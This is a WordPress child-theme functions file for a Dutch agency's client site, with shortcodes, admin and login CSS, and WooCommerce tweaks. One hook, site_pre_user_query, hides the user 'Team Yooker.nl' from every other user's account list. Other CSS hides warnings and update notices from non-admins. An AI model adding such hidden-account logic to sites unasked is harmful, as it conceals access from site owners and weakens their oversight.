<?php
//define( 'themedir', get_template_directory(__FILE__) );
//define( 'themeurl', get_template_directory_uri(__FILE__));

define( 'themedir', get_stylesheet_directory(__FILE__) );
define( 'themeurl', get_stylesheet_directory_uri(__FILE__));

// Custom functions code goes here.
function my_theme_enqueue_styles() { 
	wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );


// Huidige jaar shortcode
function year_shortcode () {
	$year = date_i18n ('Y');
	return $year;
}
add_shortcode ('jaar', 'year_shortcode');


// Bedrijfsnaam shortcode
function bedrijfsnaam_shortcode () {
	$bedrijfsnaam = get_field('bedrijfsnaam', 'option');
	return $bedrijfsnaam;
}
add_shortcode ('bedrijfsnaam', 'bedrijfsnaam_shortcode');


// Plaats shortcode
function plaats_shortcode () {
	$plaats = get_field('plaats', 'option');
	return $plaats;
}
add_shortcode ('plaatsnaam', 'plaats_shortcode');


// Straat shortcode
function straat_shortcode () {
	$straat = get_field('straat', 'option');
	return $straat;
}
add_shortcode ('straat', 'straat_shortcode');


// Postcode shortcode
function postcode_shortcode () {
	$postcode = get_field('postcode', 'option');
	return $postcode;
}
add_shortcode ('postcode', 'postcode_shortcode');


// Land shortcode
function land_shortcode () {
	$land = get_field('land', 'option');
	return $land;
}
add_shortcode ('land', 'land_shortcode');


// Adres shortcode
function adres_shortcode () {
	$adres = get_field('adres', 'option');
	return $adres;
}
add_shortcode ('adres', 'adres_shortcode');


// Website shortcode
function website_shortcode () {
	$website = get_field('website', 'option');
	return $website;
}
add_shortcode ('website', 'website_shortcode');


// Telefoonnummer shortcode
function telefoon_shortcode () {
	$telefoon_nr = get_field('telefoonnummer', 'option');
	$telefoon_link = get_field('telefoonnummer_link', 'option');
	$telefoon = "<a href='$telefoon_link'>$telefoon_nr</a>";
	return $telefoon;
}
add_shortcode ('telefoon', 'telefoon_shortcode');


// Mail shortcode
function mail_shortcode () {
	$mail_nr = get_field('email', 'option');
	$mail_link = get_field('email_link', 'option');
	$mail = "<a href='$mail_link'>$mail_nr</a>";
	return $mail;
}
add_shortcode ('email', 'mail_shortcode');


// Contactpersoon shortcode
function contactpersoon_shortcode () {
	$contactpersoon = get_field('contactpersoon', 'option');
	return $contactpersoon;
}
add_shortcode ('contactpersoon', 'contactpersoon_shortcode');


// KvK nummer shortcode
function kvknummer_shortcode () {
	$kvknummer = get_field('kvk_nummer', 'option');
	return $kvknummer;
}
add_shortcode ('kvk', 'kvknummer_shortcode');


// BTW nummer shortcode
function btwnummer_shortcode (){
	$btwnummer = get_field('btw_nummer', 'option');
	return $btwnummer;
}
add_shortcode ('btw', 'btwnummer_shortcode');

// SOCIAL MEDIA LINKS

// LinkedIn
function linkedin_shortcode (){
	$linkedin = get_field('linkedin', 'option');
	return $linkedin;
}
add_shortcode ('linkedin', 'linkedin_shortcode');

// Facebook
function facebook_shortcode (){
	$facebook = get_field('facebook', 'option');
	return $facebook;
}
add_shortcode ('facebook', 'facebook_shortcode');

// Instagram
function instagram_shortcode (){
	$instagram = get_field('instagram', 'option');
	return $instagram;
}
add_shortcode ('instagram', 'instagram_shortcode');

// YouTube
function youtube_shortcode (){
	$youtube = get_field('youtube', 'option');
	return $youtube;
}
add_shortcode ('youtube', 'youtube_shortcode');

// Twitter
function twitter_shortcode (){
	$twitter = get_field('twitter', 'option');
	return $twitter;
}
add_shortcode ('twitter', 'twitter_shortcode');

// Tiktok
function tiktok_shortcode (){
	$tiktok = get_field('tiktok', 'option');
	return $tiktok;
}
add_shortcode ('tiktok', 'tiktok_shortcode');


// Yooker verbergen als gebruiker
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;

	if ($username == 'Team Yooker.nl') {
	}

	else {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
												"WHERE 1=1 AND {$wpdb->users}.user_login != 'Team Yooker.nl'",$user_search->query_where);
	}
}


// Hide Notices
add_action('admin_head', 'admin_only_warnings');


// NON Admin CSS
function admin_only_warnings() {
	echo '<style>
		.vc_subnav-fixed{
			top: 60px !important;
			padding-left: 250px !important;
		}
		.usof-header{
			top: 64px;
			left: 250px;
		}

	</style>';
	if(is_admin() && !current_user_can('administrator') ) {
		echo '<style>
    .warning, .error, .updated, #screen-meta-links {display:none !important;}
	#a2020-notification-wrap {
	display:none !important;
	}
	#a2020-update-wrap {
	display:none !important;
	}
	#postbox-container-4{
	display:none !important;
	}
	/* Screen options */
	.index-php #maAdminToggleScreenOptions {
	display:none !important;
	}
	#a2020_overview_cards #system_info {
	display:none !important;
	}
	#menu-pages ul li:nth-child(2) {
	display:none !important;
	}
	#wpcontent .page-title-action {
	display:none;
	}
	.inline-edit-col-right {
	display:none !important;
	}
	.toplevel_page_vc-welcome {
	display:none !important;
	}
	.ma-admin-profile-img .admin2020notificationBadge{
	display:none !important;
	}
	/* Blog options */
	.post-type-post .edit-post-layout__metaboxes {
	display:none !important;
	}
	.post-type-post .components-panel div.components-panel__body:nth-child(7), .post-type-post .components-panel div.components-panel__body:nth-child(8), .post-type-post #slider_revolution_metabox {
	display:none !important;
	}
	/* Bestellingen */
	.post-type-shop_order #postcustom, .post-type-shop_order #wcj-admin-tools-order-meta {
	display:none !important;
	}
	.post-type-shop_order #wc-booster-pdf-invoicing .postbox-header .hndle {
	flex-grow:0 !important;
	}
	.post-type-shop_order #wc-booster-pdf-invoicing .postbox-header .dashicons-media-default {
	margin-right:6px !important;
	}
	/* Product options */
	.post-type-product #postbox-container-2 #wc-jetpack-admin_tools, .post-type-product #postbox-container-2 #product-meta-box, .post-type-product #postbox-container-2 #postcustom, .post-type-product #postbox-container-2 #view-meta-box, .post-type-product #postbox-container-2 #skin-meta-box, .post-type-product #postbox-container-2 #wcj-admin-tools-product-meta {
	display:none !Important;
	}
	#wpcontent .page-title-action {
	display:none;
	}
	.inline-edit-col-right {
	display:none !important;
	}
	#dashboard-widgets-wrap #dashboard_primary, #dashboard-widgets-wrap #normal-sortables {
	display:none !Important;
	}
	.edit-post-meta-boxes-area #scriptless_social_sharing {
	display:none !Important;
	}
	#total_posts, #total_pages {
	display:none !important;
	}
	.a2020_filter_wrap .uk-grid-small .uk-width-auto button.a2020_make_square {
	display:none !important;
	}
  </style>';
	}	
}



// Add css to login screen
function the_dramatist_custom_login_css() {
	echo '<style type="text/css"> body.login {
      background-image: url(/wp-content/uploads/2021/04/yooker-login-background.jpg) !important;
}
.login #login {
      position: absolute;
    top: 50%;
left:50%;
    margin-top: -235px;
    width: 350px;
  	background: rgba(66,66,66,0.9)!important /*#424242; */;
padding-top: 55px !important;
    padding-bottom: 45px !important;
box-shadow:0 0 20px 2px #00000047;
}
div#login:before {
    content: "";
    width: 375px;
    height: 350px;
    background: #3e61fcf2;
    z-index: 1;
    position: absolute;
    top: 50%;
    background-size: 75% !important;
    margin-left: -375px;
    background-position: center center;
    background-repeat: no-repeat;
    display: inline-block;
    background-image: url(/wp-content/uploads/2022/02/yooker-full-service-webbureau-logo-slogan-wit-gradient-@2.png);
    margin-top: -175px;
}
body.login #loginform, body.login #resetpassform {
  background:none !important;
  padding-top:0 !important;
border:none !important;
}
.login #loginform input[type="text"], .login #loginform input[type="password"], .login #resetpassform input[type="text"], .login #resetpassform input[type="password"] {
  background: none;
    border-top: none;
    border-left: none;
    border-right: none;
    border-color: #ccc !important;
    border-radius: 0;
	color:#fff;
}
.login #loginform input[type="checkbox"], .login #resetpassform input[type="checkbox"] {
  	background: none;
	border-color:#ccc !important;
}
.login #login h1, .login #login #nav, .login #login .privacy-policy-page-link {
  display:none !important;
}
.login {
  padding:0;
}
#loginform {
color: #fff !important;
}
#loginform input[name="brute_num"] {
    background: none;
    border: solid #fff 1.5px;
    border-radius: 5px;
    text-align: center;
    color: #fff;
    font-size: 14px;
    padding: 1px;
}
#login #loginform label, #login #resetpassform label {
color:#ccc !important;
}
#login #backtoblog a {
color:#ccc !important;
}
#login .submit input[type="submit"] {
float:none !important;
width:100% !important;
margin-top:20px !important;
}
#login #resetpassform p {
color:#fff;
}
.login #loginform #wp-submit {
background: #3e61fc;
    border-color: #3e61fc;
}
.language-switcher {
display:none !important;
}
@media only screen and (max-width: 760px) {
div#login:before {
    content: "";
    width: 350px !important;
    height: 150px !important;
    top: 0 !important;
    background-size: 150px !important;
    margin-top: -150px !important;
    margin-left:0 !important;
}
.login #login {
    margin-left: -175px !important;
    margin-top: -175px !important;
    width: 350px;
    background: rgba(66,66,66,0.9)!important /*#424242; */;
    padding-top: 55px !important;
    padding-bottom: 45px !important;
}
} </style>';
}
add_action('login_head', 'the_dramatist_custom_login_css');


// SEOPRess Breadcrumbs
if(function_exists('seopress_display_breadcrumbs')) { seopress_display_breadcrumbs(); }


//Page Slug Body Class
function add_slug_body_class( $classes ) {
	global $post;
	if ( isset( $post ) ) {
		$classes[] = $post->post_type . '-' . $post->post_name;
	}
	return $classes;
}
add_filter( 'body_class', 'add_slug_body_class' );

/**
 * Add quantity fields to Shop/Category pages.
 */
function jane_add_quantity_fields($html, $product) {

	//add quantity field only to simple products
	if ( $product && $product->is_type( 'simple' ) && $product->is_purchasable() && $product->is_in_stock() && ! $product->is_sold_individually() ) {

		//rewrite form code for add to cart button
		$html = '<form action="' . esc_url( $product->add_to_cart_url() ) . '" class="cart" method="post" enctype="multipart/form-data">';
		$html .= woocommerce_quantity_input( array(), $product, false );
		$html .= '<button type="submit" data-quantity="1" data-product_id="' . $product->get_id() . '" class="button alt ajax_add_to_cart add_to_cart_button product_type_simple">' . esc_html( $product->add_to_cart_text() ) . '</button>';
		$html .= '</form>';
	}
	return $html;
}


/**
 * Add AJAX support
 * Sync quantity field
 */
function jane_quantity_handler() {

	wc_enqueue_js( '
    jQuery(function($) {
    $("form.cart").on("change", "input.qty", function() {
    $(this.form).find("[data-quantity]").attr("data-quantity", this.value);  //used attr instead of data, for WC 4.0 compatibility
    });
    });
    ' );

}

add_action( 'init', 'jane_quantity_handler' );
add_filter( 'woocommerce_loop_add_to_cart_link', 'jane_add_quantity_fields', 10, 2 );

// add_filter( 'woocommerce_loop_add_to_cart_link', 'quantity_inputs_for_woocommerce_loop_add_to_cart_link', 10, 2 );
// function quantity_inputs_for_woocommerce_loop_add_to_cart_link( $html, $product ) {
// 	if ( $product && $product->is_type( 'simple' ) && $product->is_purchasable() && $product->is_in_stock() && ! $product->is_sold_individually() ) {
// 		$html = '<form action="' . esc_url( $product->add_to_cart_url() ) . '" class="cart" method="post" enctype="multipart/form-data">';
// 		$html .= woocommerce_quantity_input( array(), $product, false );
// 		$html .= '<button type="submit" class="button alt">' . esc_html( $product->add_to_cart_text() ) . '</button>';
// 		$html .= '</form>';
// 	}
// 	return $html;
// }


if ( ! function_exists( 'us_custom_category_count' ) ) {
	add_shortcode( 'us_custom_category_count', 'us_custom_category_count_shortcode' );

	function us_custom_category_count_shortcode( $atts ) {
		global $us_grid_term; // variable added by UpSolution Grid functionality
		if ( ! empty( $us_grid_term ) ) {
			if($us_grid_term->count !== 1){
				return $us_grid_term->count." producten";
			}
			else{
				return $us_grid_term->count." product";
			}
		} else {
			return '';
		}

	}
}

// Add gravity forms support for shop managers.
function mindsize_gravity_forms_shop_manager_role(){
	$role = get_role('shop_manager');
	// remove full access in case it was added previously
	$role->remove_cap('gform_full_access');
	$role->add_cap('gravityforms_view_entries');
	$role->add_cap('gravityforms_edit_entries');
}
add_action('admin_init','mindsize_gravity_forms_shop_manager_role');

// Categorie widget
function register_categorie_widget() {
	register_sidebar( array(
		'name' => __( 'Productcategorieën sidebar', 'yooker' ),
		'id' => 'productcategorieen-sidebar',
		'description' => __( 'Productcategorieën sidebar', 'yooker' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>'
	) );
}
add_action( 'widgets_init', 'register_categorie_widget' );


/* Accordion Repeater Field */
add_shortcode( 'wpb_accordion_acf', function ( $atts ){

	ob_start();

	// Haal FAQ id op uit shortcode
	$faq = 'faq-'.$atts['id'];

	// check if the repeater field has rows of data
	if( have_rows($faq, 'option') ):

	// loop through the rows of data for the tab header
	while( have_rows($faq, 'option') ) : the_row();


	//$header = the_sub_field('faq-titel', 'option');
	//$content = the_sub_field('faq-tekst', 'option');

?>
<div class="faq-tab">
	<button class="accordion"><?php echo the_sub_field('faq-titel', 'option'); ?></button>
	<div class="panel">
		<p><?php echo the_sub_field('faq-tekst', 'option'); ?></p>
	</div>  
</div>

<?php
	endwhile; //End the loop 

	else :

	// no rows found
	echo 'Geen FAQs gevonden';

	endif;

	return ob_get_clean();

});


function get_toepassingen() {
    global $product;

    // Get the product's terms for the "pa_toepassing" attribute
    $terms = wp_get_post_terms($product->get_id(), 'pa_toepassing');

    if (empty($terms)) {
        return 'No "pa_toepassing" attribute found for this product.';
    }

    // Define a mapping of "toepassingen" slugs to their corresponding values
    $toepassingen_mapping = array(
        'staal' => 'P',
        'rvs' => 'M',
        'gietijzer' => 'K',
        'non-ferro' => 'N',
        'hittebestendig' => 'S',
        'geharde-materialen' => 'H',
        'niet-metalen-materialen' => 'O'
    );

    $output = '<div class="toepassing-title">Geschikt voor:</div><div class="toepassing-wrapper">';

    foreach ($terms as $term) {
        // Check if the term slug exists in the mapping
        if (isset($toepassingen_mapping[$term->slug])) {
            $output .= '<div class="toepassing ' . esc_attr($term->slug) . '">';
            $output .= esc_html($toepassingen_mapping[$term->slug]);
            $output .= '</div>';
        }
    }

    $output .= '</div>';

    return $output;
}

add_shortcode('toepassingen', 'get_toepassingen');




// User circle
function user_circle_shortcode() {
    // Get the custom field value for 'us_testimonial_author'
    $writer_name = get_field('us_testimonial_author');

    // Check if the name exists
    if ($writer_name) {
        // Get the first letter of the name
        $first_letter = substr($writer_name, 0, 1);

        // Define an array of possible background colors
        $background_colors = array(
            '#0097A7',
            '#CD6797',
            '#679541',
			'#000000',
			'#917DCA',
			'#FF8D3E'
        );

        // Choose a random background color
        $random_color = $background_colors[array_rand($background_colors)];

        // Create the user circle image HTML with the random background color
        $output = '<div class="user-circle" style="background-color:' . $random_color . ';">' . $first_letter . '</div>';

        return $output;
    }
}

// Register the shortcode
add_shortcode('user-circle', 'user_circle_shortcode');

$includes = array(
	'woocommerce',
	'enqueue-styles'
);

foreach ( $includes as $include ) {
	include_once themedir . '/inc/'.$include.'/index.php';
}